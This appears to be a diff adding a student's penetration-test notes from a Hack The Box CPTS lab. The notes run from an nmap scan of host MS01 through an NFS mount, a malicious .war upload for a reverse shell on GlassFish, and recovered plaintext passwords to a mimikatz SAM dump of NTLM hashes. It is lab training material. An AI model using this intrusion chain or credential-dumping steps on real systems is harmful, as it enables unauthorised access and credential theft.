@@ -1,0 +1,210 @@
+┌──(usr㉿TheThird)-[~/Desktop/HTB/CPTS-Final/ligolo-ng]
+└─$ sudo nmap -sCV 172.16.139.35                                                               
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 09:19 EDT
+Nmap scan report for 172.16.139.35
+Host is up (0.20s latency).
+Not shown: 989 closed tcp ports (reset)
+PORT      STATE SERVICE              VERSION
+111/tcp   open  rpcbind              2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc                Microsoft Windows RPC
+139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+2049/tcp  open  nlockmgr             1-4 (RPC #100021)
+3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: trilocor
+|   NetBIOS_Domain_Name: trilocor
+|   NetBIOS_Computer_Name: MS01
+|   DNS_Domain_Name: trilocor.local
+|   DNS_Computer_Name: MS01.trilocor.local
+|   DNS_Tree_Name: trilocor.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-04-16T13:21:47+00:00
+| ssl-cert: Subject: commonName=MS01.trilocor.local
+| Not valid before: 2024-04-14T21:43:39
+|_Not valid after:  2024-10-14T21:43:39
+|_ssl-date: 2024-04-16T13:22:01+00:00; 0s from scanner time.
+4848/tcp  open  http                 Oracle GlassFish application server 3.1.2.2 (Servlet/3.0 JSP/2.2 JSF/2.0 Java/1.7)
+|_http-title: Login
+|_http-server-header: Oracle GlassFish Server 3.1.2.2
+7676/tcp  open  java-message-service Java Message Service 4.5.2 Patch 1
+8080/tcp  open  http-proxy           Oracle GlassFish Server 3.1.2.2
+|_http-server-header: Oracle GlassFish Server 3.1.2.2
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/html
+|     Content-Length: 4806
+|     Date: Tue, 16 Apr 2024 13:19:44 GMT
+|     Connection: close
+|     <!--Arbortext, Inc., 1988-2008, v.4002-->
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+|     <html lang="en">
+|     <!--
+|     ALTER OR REMOVE COPYRIGHT NOTICES OR THIS HEADER.
+|     Copyright (c) 2010, 2012 Oracle and/or its affiliates. All rights reserved.
+|     subject to License Terms
+|     <head>
+|_    <style type="text/css"> body{margin-top:0} body,td,p,div,span,a,ul,ul li, ol, ol li, ol li b, dl,h1,h2,h3,h4,h5,h6,li { font-family:geneva,helvetica,arial,"lucida sans",sans-serif; font-size:10pt } h1 {font-size:18pt} h2 {font-size:14pt} h3 {font-size:12pt} code,kbd,tt,pre { font-family:monaco,courier,"courier new"; font-size:10pt; } li {padding-bottom: 8px} p.copy, p.copy a { font-family:geneva,helvetica,arial,"lucida
+|_http-title: GlassFish Server 3.1.2 - Server Running
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE TRACE
+8181/tcp  open  ssl/intermapper?
+| ssl-cert: Subject: commonName=MS01.trilocor.local/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
+| Not valid before: 2022-07-26T13:21:24
+|_Not valid after:  2032-07-23T13:21:24
+|_ssl-date: 2024-04-16T13:22:01+00:00; 0s from scanner time.
+10000/tcp open  http                 Jetty 9.4.46.v20220331
+|_http-server-header: Jetty(9.4.46.v20220331)
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.94SVN%I=7%D=4/16%Time=661E7AF1%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,1340,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\
+SF:r\nContent-Length:\x204806\r\nDate:\x20Tue,\x2016\x20Apr\x202024\x2013:
+SF:19:44\x20GMT\r\nConnection:\x20close\r\n\r\n<!--Arbortext,\x20Inc\.,\x2
+SF:01988-2008,\x20v\.4002-->\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//D
+SF:TD\x20HTML\x204\.01\x20Transitional//EN\">\r\n<html\x20lang=\"en\">\r\n
+SF:<!--\r\nDO\x20NOT\x20ALTER\x20OR\x20REMOVE\x20COPYRIGHT\x20NOTICES\x20O
+SF:R\x20THIS\x20HEADER\.\r\n\r\nCopyright\x20\(c\)\x202010,\x202012\x20Ora
+SF:cle\x20and/or\x20its\x20affiliates\.\x20All\x20rights\x20reserved\.\r\n
+SF:\r\nUse\x20is\x20subject\x20to\x20License\x20Terms\r\n-->\r\n<head>\r\n
+SF:<style\x20type=\"text/css\">\x20\x20body{margin-top:0}\x20\x20\x20body,
+SF:td,p,div,span,a,ul,ul\x20li,\x20ol,\x20ol\x20li,\x20ol\x20li\x20b,\x20d
+SF:l,h1,h2,h3,h4,h5,h6,li\x20{\x20\x20\x20\x20\x20font-family:geneva,helve
+SF:tica,arial,\"lucida\x20sans\",sans-serif;\x20\x20\x20\x20\x20font-size:
+SF:10pt\x20\x20\x20}\x20\x20\x20h1\x20{font-size:18pt}\x20\x20\x20h2\x20{f
+SF:ont-size:14pt}\x20\x20\x20h3\x20{font-size:12pt}\x20\x20\x20code,kbd,tt
+SF:,pre\x20{\x20\x20\x20\x20\x20font-family:monaco,courier,\"courier\x20ne
+SF:w\";\x20\x20\x20\x20\x20font-size:10pt;\x20\x20\x20}\x20\x20\x20li\x20{
+SF:padding-bottom:\x208px}\x20\x20\x20p\.copy,\x20p\.copy\x20a\x20{\x20\x2
+SF:0\x20\x20\x20font-family:geneva,helvetica,arial,\"lucida")%r(HTTPOption
+SF:s,1340,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nContent
+SF:-Length:\x204806\r\nDate:\x20Tue,\x2016\x20Apr\x202024\x2013:19:44\x20G
+SF:MT\r\nConnection:\x20close\r\n\r\n<!--Arbortext,\x20Inc\.,\x201988-2008
+SF:,\x20v\.4002-->\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML
+SF:\x204\.01\x20Transitional//EN\">\r\n<html\x20lang=\"en\">\r\n<!--\r\nDO
+SF:\x20NOT\x20ALTER\x20OR\x20REMOVE\x20COPYRIGHT\x20NOTICES\x20OR\x20THIS\
+SF:x20HEADER\.\r\n\r\nCopyright\x20\(c\)\x202010,\x202012\x20Oracle\x20and
+SF:/or\x20its\x20affiliates\.\x20All\x20rights\x20reserved\.\r\n\r\nUse\x2
+SF:0is\x20subject\x20to\x20License\x20Terms\r\n-->\r\n<head>\r\n<style\x20
+SF:type=\"text/css\">\x20\x20body{margin-top:0}\x20\x20\x20body,td,p,div,s
+SF:pan,a,ul,ul\x20li,\x20ol,\x20ol\x20li,\x20ol\x20li\x20b,\x20dl,h1,h2,h3
+SF:,h4,h5,h6,li\x20{\x20\x20\x20\x20\x20font-family:geneva,helvetica,arial
+SF:,\"lucida\x20sans\",sans-serif;\x20\x20\x20\x20\x20font-size:10pt\x20\x
+SF:20\x20}\x20\x20\x20h1\x20{font-size:18pt}\x20\x20\x20h2\x20{font-size:1
+SF:4pt}\x20\x20\x20h3\x20{font-size:12pt}\x20\x20\x20code,kbd,tt,pre\x20{\
+SF:x20\x20\x20\x20\x20font-family:monaco,courier,\"courier\x20new\";\x20\x
+SF:20\x20\x20\x20font-size:10pt;\x20\x20\x20}\x20\x20\x20li\x20{padding-bo
+SF:ttom:\x208px}\x20\x20\x20p\.copy,\x20p\.copy\x20a\x20{\x20\x20\x20\x20\
+SF:x20font-family:geneva,helvetica,arial,\"lucida");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:d9:4c (VMware)
+| smb2-time: 
+|   date: 2024-04-16T13:21:47
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 167.42 seconds
+
+
+after setting up a ligolo connection to the MS01 internal network
+MS01 had a mountable drive exploitable through the NIX01 root user
+sudo mount -t nfs 172.16.139.35:/ ./MS01/ -o nolock
+
+searching the files revealed an admininistrator password that was useable on the Oracle GlassFish server console
+using these privileges, able to upload a malicious .war file to the server to obtain a reverse shell
+used this to upgrade to a more stable meterpreter shell by uploading an .exe and running
+
+MS01
+PS C:\Users\pthorpe_adm\AppData\Roaming\Microsoft\Sticky Notes> cat Stickynotes.snt
+cat Stickynotes.snt
+<- SNIP ->
+                                    DEU?~O?EuOA~O0\fnil\fcharset0 Segoe Print;}{\f1\fnil Segoe Print;}}
+{\*\generator Riched20 10.0.17763}\viewkind4\uc1 
+\pard\tx360\tx720\tx1080\tx1440\tx1800\tx2160\tx2520\tx2880\tx3240\tx3600\tx3960\tx4320\tx4680\tx5040\tx5400\tx5760\tx6120\tx6480\tx6840\tx7200\tx7560\tx7920\tx8280\tx8640\tx9000\tx9360\tx9720\tx10080\tx10440\tx10800\tx11160\tx11520\f0\fs22 Test account provided by infra (172.16.139.175:WS01):\par
+devtest:D3vel0PEr@123
+<- SNIP ->
+
+
+creds granted RDP to the WS01 box where several non-standard applications are present
+looking into each revealed an exploit with Wondershare Dr.Fone 12.0.7 RCE granting SYSTEM access to the device
+https://www.exploit-db.com/exploits/50913
+
+looking through Administrator/Downloads revealed creds for pthorpe
+$Server="172.16.139.35"
+$User="pthorpe_adm"
+$Password="pTh0Rp3_R0cK$$"
+
+which appear to allow RDP access to MS01
+
+
+using meterpreter
+used kiwi to dump all hashes
+
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter > lsa_dump_sam
+[+] Running as SYSTEM
+[*] Dumping SAM
+Domain : MS01
+SysKey : 90557b78f23225c40937c0791ad38df6
+Local SID : S-1-5-21-4027693121-2049782792-260753726
+
+SAMKey : d9cec4e96dbd975f8f1a35c1afbcbdee
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: b3a92efa782776e463a52131f7d7fd89
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070
+
+RID  : 000003ea (1002)
+User : svc_glassfish
+  Hash NTLM: abf543aaacb9c71d1d91de058d04c964
+
+RID  : 000003eb (1003)
+User : pthorpe_adm
+  Hash NTLM: fef4884eca1a4e4fff70964a893cd197
+
+RID  : 000003ec (1004)
+User : svc_jenkins
+  Hash NTLM: 8a2c7040a323929b74b14090a9f63cd0
